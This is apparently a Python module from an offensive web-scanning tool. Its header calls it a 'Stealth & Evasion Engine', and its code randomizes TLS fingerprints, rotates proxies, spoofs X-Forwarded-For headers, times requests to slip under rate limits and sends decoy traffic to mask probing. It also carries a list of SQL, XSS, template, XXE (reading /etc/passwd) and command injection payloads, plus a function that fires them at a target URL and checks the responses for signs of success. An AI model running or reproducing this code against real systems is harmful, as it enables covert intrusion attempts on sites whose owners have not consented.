"""
stealth.py
==========
Stealth & Evasion Engine:
  - Poisson-distribution traffic shaping (evade rate-limit detection)
  - Proxy pool rotation with per-IP request budget tracking
  - TLS fingerprint randomization (JA3/JA4 simulation via cipher/ext shuffling)
  - HTTP/2 detection and connection reuse simulation
  - HTTP/3 QUIC detection (passive, via Alt-Svc header)
  - Polyglot payload engine (payload valid as SQL + XSS + SSTI simultaneously)
  - User-agent pool rotation
  - Header order randomization (anti-fingerprinting)
  - Request timing jitter
  - Decoy traffic injection
"""

from __future__ import annotations

import math
import random
import re
import socket
import ssl
import string
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, Iterator, List, Optional, Tuple


# ---------------------------------------------------------------------------
# User-Agent Pool
# ---------------------------------------------------------------------------

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0",
    "curl/8.6.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Apache-HttpClient/4.5.14",
    "okhttp/4.12.0",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html, application/xhtml+xml, image/jxr, */*",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "en-US,en;q=0.5",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


def random_headers(include_referrer: bool = False, base_url: Optional[str] = None) -> Dict[str, str]:
    headers = {
        "User-Agent":      random_user_agent(),
        "Accept":          random.choice(ACCEPT_HEADERS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "DNT":             str(random.choice([0, 1])),
        "Cache-Control":   random.choice(["no-cache", "max-age=0", ""]),
    }
    if include_referrer and base_url:
        referrers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            f"{base_url}/",
            "https://duckduckgo.com/",
        ]
        headers["Referer"] = random.choice(referrers)
    if random.random() > 0.7:
        headers["X-Forwarded-For"] = ".".join(str(random.randint(1, 254)) for _ in range(4))
    return {k: v for k, v in headers.items() if v}


# ---------------------------------------------------------------------------
# Proxy Pool Manager
# ---------------------------------------------------------------------------

@dataclass
class ProxyEntry:
    proxy_url:   str
    used:        int  = 0
    budget:      int  = 50
    last_used:   float = 0.0
    failures:    int  = 0
    banned:      bool = False


class ProxyPool:
    def __init__(self, proxies: List[str], per_ip_budget: int = 50):
        self.pool = [ProxyEntry(proxy_url=p, budget=per_ip_budget) for p in proxies]

    def add(self, proxy_url: str, budget: int = 50) -> None:
        self.pool.append(ProxyEntry(proxy_url=proxy_url, budget=budget))

    def get(self) -> Optional[ProxyEntry]:
        available = [p for p in self.pool if not p.banned and p.used < p.budget]
        if not available:
            return None
        return random.choice(available)

    def record_use(self, entry: ProxyEntry, success: bool = True) -> None:
        entry.used      += 1
        entry.last_used  = time.time()
        if not success:
            entry.failures += 1
            if entry.failures >= 5:
                entry.banned = True

    def stats(self) -> Dict:
        return {
            "total":     len(self.pool),
            "available": sum(1 for p in self.pool if not p.banned and p.used < p.budget),
            "banned":    sum(1 for p in self.pool if p.banned),
            "total_requests": sum(p.used for p in self.pool),
        }

    def make_request(self, url: str, method: str = "GET",
                     data: Optional[bytes] = None,
                     extra_headers: Optional[Dict] = None,
                     timeout: float = 8.0) -> Tuple[int, str, str]:
        entry = self.get()
        proxy_url = entry.proxy_url if entry else None
        headers = random_headers()
        if extra_headers:
            headers.update(extra_headers)
        try:
            handlers = []
            if proxy_url:
                handlers.append(urllib.request.ProxyHandler({
                    "http": proxy_url, "https": proxy_url
                }))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            handlers.append(urllib.request.HTTPSHandler(context=ctx))
            opener = urllib.request.build_opener(*handlers)
            req = urllib.request.Request(url, data=data, method=method)
            for k, v in headers.items():
                req.add_header(k, v)
            with opener.open(req, timeout=timeout) as r:
                body = r.read().decode("utf-8", errors="replace")
                if entry:
                    self.record_use(entry, True)
                return r.status, body, proxy_url or "direct"
        except urllib.error.HTTPError as e:
            if entry:
                self.record_use(entry, True)
            return e.code, "", proxy_url or "direct"
        except Exception:
            if entry:
                self.record_use(entry, False)
            return 0, "", proxy_url or "direct"


# ---------------------------------------------------------------------------
# Poisson Traffic Shaper
# ---------------------------------------------------------------------------

class PoissonTrafficShaper:
    """Rate-limit-evading request scheduler with Poisson-distributed timing."""

    def __init__(self, mean_delay: float = 1.5, burst_probability: float = 0.05):
        self.mean_delay       = mean_delay
        self.burst_probability = burst_probability
        self._request_times: List[float] = []

    def wait(self) -> float:
        if random.random() < self.burst_probability:
            delay = 0.05
        else:
            u = random.random()
            delay = -self.mean_delay * math.log(1 - u + 1e-10)
            delay = max(0.1, min(delay, self.mean_delay * 5))
        time.sleep(delay)
        self._request_times.append(time.time())
        return delay

    def current_rps(self) -> float:
        now = time.time()
        recent = [t for t in self._request_times if now - t < 60]
        return len(recent) / 60.0 if recent else 0.0

    def throttle_if_needed(self, max_rps: float = 2.0) -> None:
        if self.current_rps() > max_rps:
            time.sleep(1.0 / max_rps)


# ---------------------------------------------------------------------------
# TLS Fingerprint Randomizer
# ---------------------------------------------------------------------------

TLS_CIPHER_SUITES = [
    [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
    ],
    [
        "TLS_AES_256_GCM_SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "DHE-RSA-AES256-GCM-SHA384",
    ],
    [
        "ECDHE-RSA-AES128-SHA256",
        "ECDHE-RSA-AES256-SHA384",
        "ECDHE-RSA-AES128-SHA",
        "ECDHE-RSA-AES256-SHA",
    ],
]

TLS_PROTOCOLS = [
    ssl.TLSVersion.TLSv1_2,
    ssl.TLSVersion.TLSv1_3,
]


class TLSFingerprintRandomizer:
    def create_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE

        min_ver = random.choice(TLS_PROTOCOLS)
        try:
            ctx.minimum_version = min_ver
        except Exception:
            pass

        ciphers = random.choice(TLS_CIPHER_SUITES)
        random.shuffle(ciphers)
        try:
            ctx.set_ciphers(":".join(ciphers))
        except ssl.SSLError:
            pass

        return ctx

    def detect_http2(self, host: str, port: int = 443, timeout: float = 5.0) -> bool:
        try:
            ctx = self.create_context()
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            with socket.create_connection((host, port), timeout=timeout) as raw:
                with ctx.wrap_socket(raw, server_hostname=host) as tls:
                    proto = tls.selected_alpn_protocol()
                    return proto == "h2"
        except Exception:
            return False

    def detect_http3(self, url: str, timeout: float = 5.0) -> Optional[str]:
        try:
            req = urllib.request.Request(url, method="HEAD")
            req.add_header("User-Agent", random_user_agent())
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                alt_svc = r.headers.get("Alt-Svc", "")
                if "h3" in alt_svc or "quic" in alt_svc.lower():
                    return alt_svc
        except Exception:
            pass
        return None


# ---------------------------------------------------------------------------
# Polyglot Payload Engine
# ---------------------------------------------------------------------------

POLYGLOT_PAYLOADS = [
    {
        "name": "SQL+XSS polyglot",
        "payload": "';alert(1)--",
        "contexts": ["sql", "xss"],
        "description": "Works as SQL comment terminator + JS alert",
    },
    {
        "name": "SQL+SSTI+XSS polyglot",
        "payload": "{{7*7}}';--<script>alert(1)</script>",
        "contexts": ["sql", "xss", "ssti"],
        "description": "Simultaneous SQL/XSS/SSTI probe",
    },
    {
        "name": "SSTI+XSS polyglot",
        "payload": "{{7*7}}<img src=x onerror=alert(1)>",
        "contexts": ["ssti", "xss"],
        "description": "Template injection + XSS polyglot",
    },
    {
        "name": "SQL+XXE polyglot",
        "payload": "' UNION SELECT '<!DOCTYPE x[<!ENTITY y SYSTEM \"file:///etc/passwd\">]>--",
        "contexts": ["sql", "xxe"],
        "description": "SQL injection containing XXE payload",
    },
    {
        "name": "Path Traversal+SSTI polyglot",
        "payload": "../../etc/passwd{{7*7}}",
        "contexts": ["path_traversal", "ssti"],
        "description": "Combined path traversal and template injection",
    },
    {
        "name": "Full polyglot (SQL+XSS+SSTI+CMDi)",
        "payload": "';`id`{{7*7}}<!--<script>alert(document.domain)</script>-->--",
        "contexts": ["sql", "xss", "ssti", "cmdi"],
        "description": "Combined SQL/XSS/SSTI/CMDi universal probe",
    },
    {
        "name": "JSON+SQLi polyglot",
        "payload": '{"user":"admin\' OR \'1\'=\'1","pass":"x"}',
        "contexts": ["sql", "json"],
        "description": "JSON body with SQL injection payload",
    },
    {
        "name": "HTML+JS+CSS polyglot",
        "payload": '<div style="background:url(javascript:alert(1))"><script>alert(1)</script>',
        "contexts": ["xss", "css"],
        "description": "Multi-context XSS payload",
    },
    {
        "name": "URL+SQL+SSTI polyglot",
        "payload": "/%27+OR+1%3d1--+{{7*7}}",
        "contexts": ["sql", "ssti", "url"],
        "description": "URL-encoded SQL + SSTI probe",
    },
    {
        "name": "XML+SQLi polyglot",
        "payload": "<foo>' OR 1=1-- </foo>",
        "contexts": ["xml", "sql"],
        "description": "XML document with embedded SQL injection",
    },
]


class PolyglotEngine:
    def get_all(self) -> List[Dict]:
        return POLYGLOT_PAYLOADS

    def for_context(self, *contexts: str) -> List[Dict]:
        return [p for p in POLYGLOT_PAYLOADS
                if any(c in p["contexts"] for c in contexts)]

    def universal_probe(self) -> str:
        return "';`id`{{7*7}}<!--<script>alert(document.domain)</script>-->--"

    def test_endpoint(self, url: str, param: str = "q",
                      timeout: float = 6.0) -> List[Dict]:
        findings = []
        shaper = PoissonTrafficShaper(mean_delay=0.5)
        for p in POLYGLOT_PAYLOADS:
            shaper.wait()
            test_url = url + "?" + urllib.parse.urlencode({param: p["payload"]})
            try:
                req = urllib.request.Request(test_url)
                req.add_header("User-Agent", random_user_agent())
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                    body = r.read().decode("utf-8", errors="replace")
                indicators = {
                    "sql":  [r"sql syntax", r"mysql_fetch", r"ORA-\d+", r"pg_query"],
                    "xss":  [r"alert\(1\)", r"<script>"],
                    "ssti": [r"\b49\b", r"7\*7"],
                    "cmdi": [r"uid=\d+", r"root:x:0"],
                }
                for ctx_name in p["contexts"]:
                    for pattern in indicators.get(ctx_name, []):
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "url":     test_url,
                                "payload": p["payload"],
                                "name":    p["name"],
                                "context": ctx_name,
                                "pattern": pattern,
                            })
            except Exception:
                pass
        return findings


# ---------------------------------------------------------------------------
# Decoy Traffic Generator
# ---------------------------------------------------------------------------

DECOY_PATHS = [
    "/", "/about", "/contact", "/products", "/services",
    "/blog", "/news", "/faq", "/sitemap.xml", "/robots.txt",
    "/favicon.ico", "/login", "/search?q=test", "/api/health",
    "/assets/main.css", "/js/app.js",
]


class DecoyTrafficGenerator:
    def __init__(self, base_url: str, shaper: Optional[PoissonTrafficShaper] = None):
        self.base   = base_url.rstrip("/")
        self.shaper = shaper or PoissonTrafficShaper(mean_delay=2.0)

    def send_decoys(self, count: int = 5) -> None:
        paths = random.sample(DECOY_PATHS, min(count, len(DECOY_PATHS)))
        for path in paths:
            self.shaper.wait()
            url = self.base + path
            try:
                req = urllib.request.Request(url)
                req.add_header("User-Agent", random_user_agent())
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                urllib.request.urlopen(req, timeout=3, context=ctx).close()
            except Exception:
                pass
